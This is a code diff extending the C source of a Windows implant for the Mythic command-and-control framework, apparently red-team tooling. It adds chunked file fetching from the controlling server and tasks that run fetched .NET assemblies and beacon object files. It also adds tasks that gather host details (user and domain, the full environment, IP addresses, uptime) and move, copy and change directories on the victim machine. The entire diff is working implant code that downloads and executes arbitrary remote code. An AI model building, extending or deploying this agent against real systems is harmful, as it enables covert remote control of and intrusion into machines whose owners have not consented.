@@ -1,7 +1,10 @@
 #include "common.h"
 #include "config.h"
+#include "coff.h"
 #include "crypto.h"
+#include "execasm.h"
 #include "mythic.h"
+#include "sysinfo.h"
 #include "tasks.h"
 #include <stdarg.h>
 #include <tlhelp32.h>
@@ -470,6 +473,201 @@ static cJSON *xfer_post(agent_t *a, response_t *resp, cJSON *obj, const char *ke
         return NULL;
     }
     return reply; /* caller reads fields, then deletes */
+}
+
+/* Number-valued parameter from a parameters blob, or def when
+ * absent/mistyped. Accepts JSON numbers and numeric strings. */
+static int task_param_number(const char *parameters, const char *key, int def) {
+    cJSON *root, *v;
+    int n = def;
+    if (!parameters)
+        parameters = "";
+    root = cJSON_Parse(parameters);
+    if (!root)
+        return def;
+    v = cJSON_GetObjectItemCaseSensitive(root, key);
+    if (cJSON_IsNumber(v))
+        n = (int)v->valuedouble;
+    else if (cJSON_IsString(v) && v->valuestring)
+        n = atoi(v->valuestring);
+    cJSON_Delete(root);
+    return n;
+}
+
+static int hexval(char c) {
+    if (c >= '0' && c <= '9')
+        return c - '0';
+    if (c >= 'a' && c <= 'f')
+        return c - 'a' + 10;
+    if (c >= 'A' && c <= 'F')
+        return c - 'A' + 10;
+    return -1;
+}
+
+/* Decode even-length hex into malloc'd bytes (*len). NULL on bad input. */
+static unsigned char *unhex(const char *hex, size_t *len) {
+    size_t n, i;
+    unsigned char *out;
+    *len = 0;
+    if (!hex)
+        return NULL;
+    n = strlen(hex);
+    if (n == 0 || n % 2 != 0)
+        return NULL;
+    out = (unsigned char *)malloc(n / 2);
+    if (!out)
+        return NULL;
+    for (i = 0; i < n / 2; i++) {
+        int hi = hexval(hex[2 * i]), lo = hexval(hex[2 * i + 1]);
+        if (hi < 0 || lo < 0) {
+            free(out);
+            return NULL;
+        }
+        out[i] = (unsigned char)(hi * 16 + lo);
+    }
+    *len = n / 2;
+    return out;
+}
+
+/* Pull one Mythic file chunk. Returns 0 with *raw (malloc'd, decoded)
+ * and *total set; -1 with errbuf filled. Posts no completion. */
+static int fetch_chunk(agent_t *a, response_t *resp, const char *file_id,
+                       int chunk, int chunk_size, unsigned char **raw,
+                       size_t *rawlen, int *total, char *errbuf, size_t errcap) {
+    cJSON *ul, *reply, *r;
+    int total_chunks;
+    *raw = NULL;
+    *rawlen = 0;
+    ul = cJSON_CreateObject();
+    if (!ul) {
+        snprintf(errbuf, errcap, "out of memory");
+        return -1;
+    }
+    cJSON_AddNumberToObject(ul, "chunk_num", chunk);
+    cJSON_AddNumberToObject(ul, "chunk_size", chunk_size);
+    cJSON_AddStringToObject(ul, "file_id", file_id);
+    reply = xfer_post(a, resp, ul, "upload", errbuf, errcap);
+    if (!reply)
+        return -1;
+    r = post_reply_find(reply, resp->task_id);
+    total_chunks = (int)json_num(r, "total_chunks");
+    if (total_chunks <= 0 || total_chunks > XFER_MAX_CHUNKS) {
+        snprintf(errbuf, errcap, "bad total_chunks %d", total_chunks);
+        cJSON_Delete(reply);
+        return -1;
+    }
+    *raw = b64_decode(json_str(r, "chunk_data"), rawlen);
+    cJSON_Delete(reply);
+    if (!*raw && *rawlen != 0) {
+        snprintf(errbuf, errcap, "bad chunk %d encoding", chunk);
+        return -1;
+    }
+    *total = total_chunks;
+    return 0;
+}
+
+#define MAX_FETCH_BYTES (16u * 1024u * 1024u)
+
+/* Fetch a Mythic file into malloc'd memory (*len, capped). */
+static int fetch_to_mem(agent_t *a, response_t *resp, const char *file_id,
+                        unsigned char **data, size_t *len, char *errbuf, size_t errcap) {
+    int chunk_size, chunk, total = -1;
+    size_t cap = 0;
+    *data = NULL;
+    *len = 0;
+    if (!file_id || !*file_id) {
+        snprintf(errbuf, errcap, "no file id");
+        return -1;
+    }
+    chunk_size = xfer_chunk_size(a->cfg.profile);
+    for (chunk = 1;; chunk++) {
+        unsigned char *raw = NULL;
+        size_t rawlen = 0;
+        unsigned char *grown;
+        if (fetch_chunk(a, resp, file_id, chunk, chunk_size, &raw, &rawlen,
+                        &total, errbuf, errcap) != 0) {
+            free(*data);
+            *data = NULL;
+            *len = 0;
+            return -1;
+        }
+        if (*len + rawlen > MAX_FETCH_BYTES) {
+            free(raw);
+            free(*data);
+            *data = NULL;
+            *len = 0;
+            snprintf(errbuf, errcap, "file too large");
+            return -1;
+        }
+        if (*len + rawlen > cap) {
+            cap = *len + rawlen;
+            grown = (unsigned char *)realloc(*data, cap ? cap : 1);
+            if (!grown) {
+                free(raw);
+                free(*data);
+                *data = NULL;
+                *len = 0;
+                snprintf(errbuf, errcap, "out of memory");
+                return -1;
+            }
+            *data = grown;
+        }
+        memcpy(*data + *len, raw, rawlen);
+        *len += rawlen;
+        free(raw);
+        if (chunk >= total)
+            break;
+    }
+    return 0;
+}
+
+/* Fetch a Mythic file into a temp path (out, cap). The caller deletes it. */
+static int fetch_to_temp(agent_t *a, response_t *resp, const char *file_id,
+                         char *out, size_t cap, char *errbuf, size_t errcap) {
+    char dir[MAX_PATH], path[MAX_PATH];
+    HANDLE h;
+    int chunk_size, chunk, total = -1;
+    if (cap > 0)
+        out[0] = '\0';
+    if (!file_id || !*file_id) {
+        snprintf(errbuf, errcap, "no file id");
+        return -1;
+    }
+    if (!GetTempPathA(sizeof(dir), dir) || !GetTempFileNameA(dir, "erl", 0, path)) {
+        snprintf(errbuf, errcap, "no temp path");
+        return -1;
+    }
+    h = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (h == INVALID_HANDLE_VALUE) {
+        snprintf(errbuf, errcap, "cannot create temp file");
+        return -1;
+    }
+    chunk_size = xfer_chunk_size(a->cfg.profile);
+    for (chunk = 1;; chunk++) {
+        unsigned char *raw = NULL;
+        size_t rawlen = 0;
+        DWORD wrote = 0;
+        if (fetch_chunk(a, resp, file_id, chunk, chunk_size, &raw, &rawlen,
+                        &total, errbuf, errcap) != 0) {
+            CloseHandle(h);
+            DeleteFileA(path);
+            return -1;
+        }
+        if (rawlen > 0 && (!WriteFile(h, raw, (DWORD)rawlen, &wrote, NULL) || wrote != rawlen)) {
+            free(raw);
+            CloseHandle(h);
+            DeleteFileA(path);
+            snprintf(errbuf, errcap, "write failed at chunk %d", chunk);
+            return -1;
+        }
+        free(raw);
+        if (chunk >= total)
+            break;
+    }
+    CloseHandle(h);
+    strncpy(out, path, cap - 1);
+    out[cap - 1] = '\0';
+    return 0;
 }
 
 static int task_download(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now) {
@@ -1038,6 +1236,366 @@ static int task_exit(agent_t *a, const char *arg, response_t *resp, char **outpu
     return 0;
 }
 
+static int task_execute_assembly(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now) {
+    char file_id[128], args[8192], tmp[MAX_PATH], err[256], *exec_out = NULL;
+    char ascratch[8192];
+    const char *as;
+    (void)exit_now;
+    task_param(arg, "assembly_file", file_id, sizeof(file_id));
+    as = task_param(arg, "assembly_arguments", ascratch, sizeof(ascratch));
+    strncpy(args, as, sizeof(args) - 1);
+    args[sizeof(args) - 1] = '\0';
+    if (file_id[0] == '\0')
+        return failf(resp, output, "error: no assembly file id");
+    if (fetch_to_temp(a, resp, file_id, tmp, sizeof(tmp), err, sizeof(err)) != 0)
+        return failf(resp, output, "error: %s", err);
+    if (execasm_run(tmp, args, &exec_out) != 0) {
+        int rc;
+        DeleteFileA(tmp);
+        rc = failf(resp, output, "%s", exec_out ? exec_out : "error: assembly failed");
+        free(exec_out);
+        return rc;
+    }
+    DeleteFileA(tmp);
+    *output = exec_out;
+    resp->user_output = *output;
+    {
+        char artifact[8320];
+        snprintf(artifact, sizeof(artifact), "execute_assembly %s", args);
+        resp->extra_json = artifacts_fragment("Process Create", artifact);
+    }
+    return 0;
+}
+
+static int task_execute_coff(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now) {
+    char file_id[128], fn[256], err[256], *coff_out = NULL;
+    unsigned char *obj = NULL, *argsbuf = NULL, *hexbuf = NULL;
+    size_t objlen = 0, argslen = 0, hexlen = 0;
+    const char *hexargs = "";
+    cJSON *root;
+    int timeout;
+    unsigned total;
+    (void)exit_now;
+    task_param(arg, "bof_file", file_id, sizeof(file_id));
+    task_param(arg, "function_name", fn, sizeof(fn));
+    if (fn[0] == '\0')
+        strcpy(fn, "go");
+    /* coff_arguments can be large (base64 payloads), so read it straight
+     * off the parsed blob instead of through a fixed scratch buffer. */
+    root = cJSON_Parse(arg ? arg : "");
+    if (root) {
+        cJSON *v = cJSON_GetObjectItemCaseSensitive(root, "coff_arguments");
+        if (cJSON_IsString(v) && v->valuestring)
+            hexargs = v->valuestring;
+        if (hexargs[0] != '\0') {
+            hexbuf = unhex(hexargs, &hexlen);
+            if (!hexbuf) {
+                cJSON_Delete(root);
+                return failf(resp, output, "error: bad coff_arguments hex");
+            }
+        }
+        cJSON_Delete(root);
+    }
+    if (!hexbuf) {
+        hexbuf = (unsigned char *)malloc(4);
+        if (!hexbuf)
+            return failf(resp, output, "error: out of memory");
+        memset(hexbuf, 0, 4);
+        hexlen = 4;
+    }
+    if (hexlen < 4) {
+        free(hexbuf);
+        return failf(resp, output, "error: bad coff_arguments: truncated");
+    }
+    total = (unsigned)hexbuf[0] | ((unsigned)hexbuf[1] << 8) |
+            ((unsigned)hexbuf[2] << 16) | ((unsigned)hexbuf[3] << 24);
+    if (total != hexlen - 4) {
+        free(hexbuf);
+        return failf(resp, output, "error: bad coff_arguments: total %u, have %u", total,
+                     (unsigned)(hexlen - 4));
+    }
+    argsbuf = hexbuf;
+    argslen = hexlen;
+    timeout = task_param_number(arg, "timeout", 30);
+    if (timeout < 1)
+        timeout = 1;
+    if (timeout > 86400)
+        timeout = 86400;
+    if (file_id[0] == '\0') {
+        free(argsbuf);
+        return failf(resp, output, "error: no bof file id");
+    }
+    if (fetch_to_mem(a, resp, file_id, &obj, &objlen, err, sizeof(err)) != 0) {
+        free(argsbuf);
+        return failf(resp, output, "error: %s", err);
+    }
+    if (objlen == 0) {
+        free(obj);
+        free(argsbuf);
+        return failf(resp, output, "error: empty bof");
+    }
+    if (coff_run(obj, objlen, fn, argsbuf, argslen, timeout, &coff_out) != 0) {
+        int rc;
+        free(obj);
+        free(argsbuf);
+        rc = failf(resp, output, "%s", coff_out ? coff_out : "error: bof failed");
+        free(coff_out);
+        return rc;
+    }
+    free(obj);
+    free(argsbuf);
+    *output = coff_out;
+    resp->user_output = *output;
+    {
+        char artifact[512];
+        snprintf(artifact, sizeof(artifact), "execute_coff %s", fn);
+        resp->extra_json = artifacts_fragment("Process Create", artifact);
+    }
+    return 0;
+}
+
+static int task_whoami(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now) {
+    char user[512], domain[256], combined[1024];
+    (void)a;
+    (void)arg;
+    (void)exit_now;
+    sysinfo_user(user, sizeof(user));
+    domain[0] = '\0';
+    if (!GetEnvironmentVariableA("USERDNSDOMAIN", domain, sizeof(domain)))
+        GetEnvironmentVariableA("USERDOMAIN", domain, sizeof(domain));
+    if (user[0] && domain[0] && !strchr(user, '\\'))
+        snprintf(combined, sizeof(combined), "%s\\%s", domain, user);
+    else if (user[0])
+        snprintf(combined, sizeof(combined), "%s", user);
+    else if (domain[0])
+        snprintf(combined, sizeof(combined), "%s", domain);
+    else
+        snprintf(combined, sizeof(combined), "unknown user");
+    *output = _strdup(combined);
+    if (!*output)
+        return failf(resp, output, "error: out of memory");
+    resp->user_output = *output;
+    return 0;
+}
+
+static int task_env(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now) {
+    char *block, *p;
+    size_t len = 0, cap = 0;
+    (void)a;
+    (void)arg;
+    (void)exit_now;
+    block = GetEnvironmentStringsA();
+    if (!block)
+        return failf(resp, output, "error: no environment");
+    *output = NULL;
+    for (p = block; *p; p += strlen(p) + 1) {
+        size_t elen = strlen(p);
+        char *grown;
+        if (len + elen + 2 > cap) {
+            cap = len + elen + 2;
+            grown = (char *)realloc(*output, cap ? cap : 1);
+            if (!grown) {
+                free(*output);
+                *output = NULL;
+                FreeEnvironmentStringsA(block);
+                return failf(resp, output, "error: out of memory");
+            }
+            *output = grown;
+        }
+        memcpy(*output + len, p, elen);
+        len += elen;
+        (*output)[len++] = '\n';
+    }
+    FreeEnvironmentStringsA(block);
+    if (!*output)
+        *output = _strdup("");
+    else
+        (*output)[len] = '\0';
+    if (!*output)
+        return failf(resp, output, "error: out of memory");
+    resp->user_output = *output;
+    return 0;
+}
+
+static int task_pwd(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now) {
+    char dir[MAX_PATH];
+    (void)a;
+    (void)arg;
+    (void)exit_now;
+    if (!GetCurrentDirectoryA(sizeof(dir), dir))
+        return failf(resp, output, "error: cannot read working directory");
+    *output = _strdup(dir);
+    if (!*output)
+        return failf(resp, output, "error: out of memory");
+    resp->user_output = *output;
+    return 0;
+}
+
+static int task_cd(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now) {
+    char dir[MAX_PATH];
+    const char *p;
+    (void)a;
+    (void)exit_now;
+    p = arg ? arg : "";
+    while (*p == ' ' || *p == '\t')
+        p++;
+    if (!*p)
+        return failf(resp, output, "error: usage: cd <path>");
+    if (!SetCurrentDirectoryA(p))
+        return failf(resp, output, "error: cannot change to %.400s", p);
+    if (!GetCurrentDirectoryA(sizeof(dir), dir))
+        snprintf(dir, sizeof(dir), "%s", p);
+    *output = (char *)malloc(MAX_PATH + 32);
+    if (!*output)
+        return failf(resp, output, "error: out of memory");
+    snprintf(*output, MAX_PATH + 32, "changed to %s", dir);
+    resp->user_output = *output;
+    return 0;
+}
+
+/* Split "a b" (exactly two whitespace-separated fields) for cp/mv. */
+static int split_two(const char *s, char *first, size_t fcap, char *second, size_t scap) {
+    const char *a, *b, *end;
+    size_t n;
+    if (!s)
+        return -1;
+    while (*s == ' ' || *s == '\t' || *s == '\r' || *s == '\n')
+        s++;
+    a = s;
+    while (*s && *s != ' ' && *s != '\t' && *s != '\r' && *s != '\n')
+        s++;
+    end = s;
+    while (*s == ' ' || *s == '\t' || *s == '\r' || *s == '\n')
+        s++;
+    b = s;
+    while (*s && *s != ' ' && *s != '\t' && *s != '\r' && *s != '\n')
+        s++;
+    n = s - b;
+    while (*s == ' ' || *s == '\t' || *s == '\r' || *s == '\n')
+        s++;
+    if (a == end || n == 0 || *s != '\0')
+        return -1;
+    if ((size_t)(end - a) >= fcap || n >= scap)
+        return -1;
+    memcpy(first, a, (size_t)(end - a));
+    first[end - a] = '\0';
+    memcpy(second, b, n);
+    second[n] = '\0';
+    return 0;
+}
+
+/* Read source/destination from a cp/mv blob: named keys, else a
+ * hand-built "a b" arguments string. */
+static int twin_paths(const char *arg, char *src, size_t scap, char *dst, size_t dcap) {
+    cJSON *root, *v;
+    int rc = -1;
+    task_param(arg, "source", src, scap);
+    task_param(arg, "destination", dst, dcap);
+    if (src[0] && dst[0])
+        return 0;
+    root = cJSON_Parse(arg ? arg : "");
+    if (root) {
+        v = cJSON_GetObjectItemCaseSensitive(root, "arguments");
+        if (cJSON_IsString(v) && v->valuestring)
+            rc = split_two(v->valuestring, src, scap, dst, dcap);
+        cJSON_Delete(root);
+        return rc;
+    }
+    return split_two(arg, src, scap, dst, dcap);
+}
+
+static int task_cp(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now) {
+    char src[MAX_PATH], dst[MAX_PATH];
+    (void)a;
+    (void)exit_now;
+    if (twin_paths(arg, src, sizeof(src), dst, sizeof(dst)) != 0)
+        return failf(resp, output, "error: usage: cp <source> <destination>");
+    {
+        /* INVALID carries the directory bit, so check validity first;
+         * a missing source then reports from CopyFile below. */
+        DWORD attrs = GetFileAttributesA(src);
+        if (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY))
+            return failf(resp, output, "error: not a file: %.400s", src);
+    }
+    if (!CopyFileA(src, dst, FALSE))
+        return failf(resp, output, "error: cannot copy %.200s -> %.200s", src, dst);
+    *output = (char *)malloc(MAX_PATH * 2 + 32);
+    if (!*output)
+        return failf(resp, output, "error: out of memory");
+    snprintf(*output, MAX_PATH * 2 + 32, "copied %s -> %s", src, dst);
+    resp->user_output = *output;
+    return 0;
+}
+
+static int task_mv(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now) {
+    char src[MAX_PATH], dst[MAX_PATH];
+    (void)a;
+    (void)exit_now;
+    if (twin_paths(arg, src, sizeof(src), dst, sizeof(dst)) != 0)
+        return failf(resp, output, "error: usage: mv <source> <destination>");
+    if (!MoveFileA(src, dst)) {
+        /* MoveFile cannot cross volumes; copy+delete covers that. */
+        if (!CopyFileA(src, dst, FALSE) || !DeleteFileA(src))
+            return failf(resp, output, "error: cannot move %.200s -> %.200s", src, dst);
+    }
+    *output = (char *)malloc(MAX_PATH * 2 + 32);
+    if (!*output)
+        return failf(resp, output, "error: out of memory");
+    snprintf(*output, MAX_PATH * 2 + 32, "moved %s -> %s", src, dst);
+    resp->user_output = *output;
+    return 0;
+}
+
+static int task_ipconfig(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now) {
+    char host[256], ips[4096];
+    (void)a;
+    (void)arg;
+    (void)exit_now;
+    sysinfo_host(host, sizeof(host));
+    sysinfo_ips(ips, sizeof(ips));
+    *output = (char *)malloc(sizeof(host) + sizeof(ips) + 32);
+    if (!*output)
+        return failf(resp, output, "error: out of memory");
+    if (ips[0])
+        snprintf(*output, sizeof(host) + sizeof(ips) + 32, "host: %s\n%s", host, ips);
+    else
+        snprintf(*output, sizeof(host) + sizeof(ips) + 32, "host: %s", host);
+    resp->user_output = *output;
+    return 0;
+}
+
+static int task_uptime(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now) {
+    unsigned long long secs;
+    unsigned days, hours, mins;
+    (void)a;
+    (void)arg;
+    (void)exit_now;
+    secs = GetTickCount64() / 1000;
+    days = (unsigned)(secs / 86400);
+    secs %= 86400;
+    hours = (unsigned)(secs / 3600);
+    secs %= 3600;
+    mins = (unsigned)(secs / 60);
+    secs %= 60;
+    /* Each part is at most 11 chars (%u range + suffix) in a 24-byte
+     * window, so the 128-byte buffer cannot overflow. */
+    *output = (char *)malloc(128);
+    if (!*output)
+        return failf(resp, output, "error: out of memory");
+    {
+        char *p = *output + snprintf(*output, 8, "uptime ");
+        if (days > 0)
+            p += snprintf(p, 24, "%ud", days);
+        if (hours > 0 || days > 0)
+            p += snprintf(p, 24, "%uh", hours);
+        if (mins > 0 || hours > 0 || days > 0)
+            p += snprintf(p, 24, "%um", mins);
+        snprintf(p, 24, "%us", (unsigned)secs);
+    }
+    resp->user_output = *output;
+    return 0;
+}
+
 /* Dispatch table. To add a command, add a row plus a task_* handler here,
  * a row in the Go table (agent_code/tasks.go) and a row in the container
  * commandSpecs. */
@@ -1055,6 +1613,16 @@ static const struct {
     {"mkdir", task_mkdir},
     {"ps", task_ps},
     {"kill", task_kill},
+    {"execute_assembly", task_execute_assembly},
+    {"execute_coff", task_execute_coff},
+    {"whoami", task_whoami},
+    {"env", task_env},
+    {"pwd", task_pwd},
+    {"cd", task_cd},
+    {"cp", task_cp},
+    {"mv", task_mv},
+    {"ipconfig", task_ipconfig},
+    {"uptime", task_uptime},
     {"load", task_load},
     {"unload", task_unload},
     {"exit", task_exit},
